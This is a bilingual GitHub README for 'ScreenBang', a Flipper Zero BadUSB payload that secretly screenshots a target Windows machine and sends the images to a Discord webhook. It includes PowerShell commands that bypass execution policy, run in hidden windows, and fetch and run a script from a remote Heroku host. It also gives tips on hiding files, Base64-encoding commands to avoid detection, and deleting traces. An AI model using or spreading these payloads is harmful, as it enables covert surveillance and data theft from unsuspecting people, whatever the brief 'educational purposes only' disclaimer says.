![English Flag](https://upload.wikimedia.org/wikipedia/en/thumb/a/ae/Flag_of_the_United_Kingdom.svg/1200px-Flag_of_the_United_Kingdom.svg.png)

# **ScreenBang**

**ScreenBang** is a Flipper Zero payload project designed to discreetly capture screenshots of a target Windows machine and send them directly to a Discord channel via a webhook. This repository provides both customizable and pre-configured payloads to cater to various user needs, making it a turnkey solution for Flipper Zero users.

---

## **Features**

- 📸 **Screenshot Capture**: Takes a full-screen screenshot of the target machine.
- 🚀 **Discord Webhook Integration**: Automatically sends screenshots to a Discord channel.
- 🧹 **Automatic Cleanup**: Deletes temporary files, including the script, after execution.
- 🕵️ **Stealth Mode**: Executes commands in hidden PowerShell windows to avoid detection.
- 🔌 **Flipper Zero Integration**: Optimized for Flipper Zero’s BadUSB functionality with both configurable and pre-configured payloads.
- 📂 **Customizable File Paths**: Allows users to specify temporary file locations for enhanced discretion.
- 💡 **User-Friendly Setup**: Minimal configuration required for pre-configured payloads.

---

## **Project Structure**

```
ScreenBang/
│
├── syshelper.py           # Python script for screenshot capture and Discord webhook
├── app.py                 # Flask server for hosting the script
├── screen_bang.txt        # Customizable payload (placeholders for user configuration)
├── screen_bang_CONFIGURED.txt # Pre-configured payload (ready to use)
├── LICENSE                # MIT License
├── README.md              # Project documentation
```

---

## **Payloads Overview**

### **1. screen_bang.txt**

A flexible payload that allows user configuration:

- Replace `<your app url>` with the URL hosting the `syshelper.py` script.
- Replace `<your webhook here>` with your Discord webhook URL.

### **2. screen_bang_CONFIGURED.txt**

A pre-configured payload for direct use:

- Pre-configured to download the `syshelper.py` script from `https://screenshot-badkb-806c08a412f9.herokuapp.com/`.
- Replace `<your webhook here>` with your Discord webhook URL.

---

## **Requirements**

- A **Flipper Zero** device with BadUSB functionality enabled.
- A **Discord Webhook URL**.
- A target machine running Windows (7, 10, or 11) with Python installed.

### **Optional Setup for Developers**

- Flask server for hosting the script (`app.py`).
- Required Python libraries:
  - `requests`
  - `Pillow`

---

## **Installation**

### **1. Clone the Repository**

```bash
git clone https://github.com/DuarteAd/ScreenBang.git
cd ScreenBang
```

### **2. Deploy the Flask Server (Optional)**

1. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
2. Deploy to a cloud platform like Heroku:
   ```bash
   heroku create
   git push heroku main
   ```
3. Your server will host `syshelper.py` for payloads to download.

---

### **3. Prepare the Payloads**

1. **Customizable Payload (`screen_bang.txt`)**:

   - Replace the placeholders in the file with your application URL and Discord webhook.
   - Example:
     ```plaintext
     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(Invoke-WebRequest -Uri '<your app url>' -OutFile 'C:\\Users\\Public\\syshelper.py')"
     ```

2. **Pre-configured Payload (`screen_bang_CONFIGURED.txt`)**:

   - Replace `<your webhook here>` with your Discord webhook URL.
   - Example:
     ```plaintext
     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "python 'C:\\Users\\Public\\syshelper.py' '<your webhook here>'"
     ```

3. **Upload to Flipper Zero**:
   - Copy the `.txt` payload files to the `badusb` folder on your Flipper Zero.

---

## **Usage**

1. Insert the Flipper Zero into the USB port of the target machine.
2. Select and execute the desired payload from the Flipper Zero BadUSB menu.
3. Monitor your Discord channel for screenshots sent by the payload.

---

## **Customization Tips**

- **Changing Temporary File Location**:

  - Modify the paths in the payloads to store `syshelper.py` in a more discreet location, such as `C:\Windows\Temp`.

- **Obfuscating Commands**:

  - Encode PowerShell commands in Base64 for added discretion.
    ```powershell
    powershell -EncodedCommand <Base64EncodedCommand>
    ```

- **Testing Locally**:

  - Test each payload in a controlled environment to verify functionality before deploying on the Flipper Zero.

- **Adding Logs**:
  - Insert logs in `syshelper.py` to debug or monitor operations discreetly.

---

## **Troubleshooting**

- **Python Not Found**:

  - Ensure Python is installed on the target machine and added to the system PATH.

- **Webhook Not Working**:

  - Verify the Discord webhook URL and ensure it is active.

- **File Not Downloaded**:
  - Check the application URL and ensure the hosting server is running correctly.

---

## **Security and Disclaimer**

This tool is for **educational purposes only**. Unauthorized use of this tool is **strictly prohibited** and may violate local laws. Always obtain explicit permission before using this tool on any machine.

---

## **Contributing**

We welcome contributions to enhance the functionality and usability of ScreenBang. Open an issue or submit a pull request to share your ideas.

---

## **Credits**

- **DuarteAd**: Project creator and maintainer.
- **Flipper Zero Community**: For their innovation and support.

---

## **License**

This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software with proper credit to the original author.

---

## **Support**

For issues, questions, or suggestions, feel free to open an issue on [GitHub](https://github.com/DuarteAd/ScreenBang).


#![French Flag](https://upload.wikimedia.org/wikipedia/en/thumb/c/c3/Flag_of_France.svg/1200px-Flag_of_France.svg.png)

# **ScreenBang**

**ScreenBang** est un projet de payload pour Flipper Zero conçu pour capturer discrètement des captures d'écran d'une machine Windows cible et les envoyer directement à un canal Discord via un webhook. Ce dépôt propose des payloads personnalisables et préconfigurés pour répondre aux besoins variés des utilisateurs, offrant ainsi une solution clé en main pour les utilisateurs de Flipper Zero.

---

## **Fonctionnalités**

- 📸 **Capture d'écran** : Prend une capture complète de l'écran de la machine cible.
- 🚀 **Intégration Discord** : Envoie automatiquement les captures d'écran à un canal Discord.
- 🧹 **Nettoyage automatique** : Supprime les fichiers temporaires, y compris le script, après exécution.
- 🕵️ **Mode furtif** : Exécute les commandes dans des fenêtres PowerShell cachées pour éviter la détection.
- 🔌 **Intégration Flipper Zero** : Optimisé pour la fonctionnalité BadUSB du Flipper Zero avec des payloads configurables et préconfigurés.
- 📂 **Chemins de fichiers personnalisables** : Permet aux utilisateurs de spécifier les emplacements des fichiers temporaires pour une discrétion accrue.
- 💡 **Configuration intuitive** : Configuration minimale requise pour les payloads préconfigurés.

---

## **Structure du projet**

```
ScreenBang/
│
├── syshelper.py           # Script Python pour la capture d'écran et l'envoi Discord
├── app.py                 # Serveur Flask pour héberger le script
├── screen_bang.txt        # Payload personnalisable (placeholders pour la configuration utilisateur)
├── screen_bang_CONFIGURED.txt # Payload préconfiguré (prêt à l'emploi)
├── LICENSE                # Licence MIT
├── README.md              # Documentation du projet
```

---

## **Payloads disponibles**

### **1. screen_bang.txt**

Un payload flexible qui permet une configuration utilisateur :

- Remplacez `<your app url>` par l'URL hébergeant le script `syshelper.py`.
- Remplacez `<your webhook here>` par l'URL de votre webhook Discord.

### **2. screen_bang_CONFIGURED.txt**

Un payload préconfiguré prêt à l'emploi :

- Préconfiguré pour télécharger le script `syshelper.py` depuis `https://screenshot-badkb-806c08a412f9.herokuapp.com/`.
- Remplacez `<your webhook here>` par l'URL de votre webhook Discord.

---

## **Prérequis**

- Un **Flipper Zero** avec la fonctionnalité BadUSB activée.
- Une **URL de webhook Discord**.
- Une machine cible sous Windows (7, 10 ou 11) avec Python installé.

### **Configuration optionnelle pour les développeurs**

- Serveur Flask pour héberger le script (`app.py`).
- Bibliothèques Python requises :
  - `requests`
  - `Pillow`

---

## **Installation**

### **1. Cloner le dépôt**

```bash
git clone https://github.com/DuarteAd/ScreenBang.git
cd ScreenBang
```

### **2. Déployer le serveur Flask (Optionnel)**

1. Installez les dépendances :
   ```bash
   pip install -r requirements.txt
   ```
2. Déployez sur une plateforme cloud comme Heroku :
   ```bash
   heroku create
   git push heroku main
   ```
3. Votre serveur hébergera `syshelper.py` pour le téléchargement des payloads.

---

### **3. Préparer les payloads**

1. **Payload personnalisable (`screen_bang.txt`)** :

   - Remplacez les placeholders dans le fichier par l'URL de votre application et votre webhook Discord.
   - Exemple :
     ```plaintext
     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "(Invoke-WebRequest -Uri '<your app url>' -OutFile 'C:\\Users\\Public\\syshelper.py')"
     ```

2. **Payload préconfiguré (`screen_bang_CONFIGURED.txt`)** :

   - Remplacez `<your webhook here>` par l'URL de votre webhook Discord.
   - Exemple :
     ```plaintext
     STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "python 'C:\\Users\\Public\\syshelper.py' '<your webhook here>'"
     ```

3. **Charger sur le Flipper Zero** :
   - Copiez les fichiers `.txt` dans le dossier `badusb` de votre Flipper Zero.

---

## **Utilisation**

1. Insérez le Flipper Zero dans le port USB de la machine cible.
2. Sélectionnez et exécutez le payload souhaité depuis le menu BadUSB du Flipper Zero.
3. Surveillez votre canal Discord pour les captures d'écran envoyées par le payload.

---

## **Conseils de personnalisation**

- **Changer l'emplacement des fichiers temporaires** :

  - Modifiez les chemins dans les payloads pour stocker `syshelper.py` dans un emplacement plus discret, tel que `C:\Windows\Temp`.

- **Obfuscation des commandes** :

  - Encodez les commandes PowerShell en Base64 pour plus de discrétion.
    ```powershell
    powershell -EncodedCommand <Base64EncodedCommand>
    ```

- **Tests locaux** :

  - Testez chaque payload dans un environnement contrôlé pour vérifier son bon fonctionnement avant de le déployer sur le Flipper Zero.

- **Ajout de journaux** :
  - Insérez des logs dans `syshelper.py` pour déboguer ou surveiller les opérations discrètement.

---

## **Dépannage**

- **Python introuvable** :

  - Assurez-vous que Python est installé sur la machine cible et ajouté au PATH du système.

- **Webhook non fonctionnel** :

  - Vérifiez l'URL du webhook Discord et assurez-vous qu'il est actif.

- **Fichier non téléchargé** :
  - Vérifiez l'URL de l'application et assurez-vous que le serveur d'hébergement fonctionne correctement.

---

## **Sécurité et avertissement**

Cet outil est destiné **uniquement à des fins éducatives**. Toute utilisation non autorisée de cet outil est **strictement interdite** et peut enfreindre les lois locales. Obtenez toujours une autorisation explicite avant d'utiliser cet outil sur une machine.

---

## **Contributions**

Nous accueillons les contributions pour améliorer la fonctionnalité et l'utilisabilité de ScreenBang. Ouvrez une issue ou soumettez une pull request pour partager vos idées.

---

## **Crédits**

- **DuarteAd** : Créateur et mainteneur du projet.
- **Communauté Flipper Zero** : Pour leur innovation et leur soutien.

---

## **Licence**

Ce projet est sous licence **MIT**. Vous êtes libre de l'utiliser, de le modifier et de le distribuer avec un crédit approprié à l'auteur original.

---

## **Support**

Pour tout problème, question ou suggestion, n'hésitez pas à ouvrir une issue sur [GitHub](https://github.com/DuarteAd/ScreenBang).
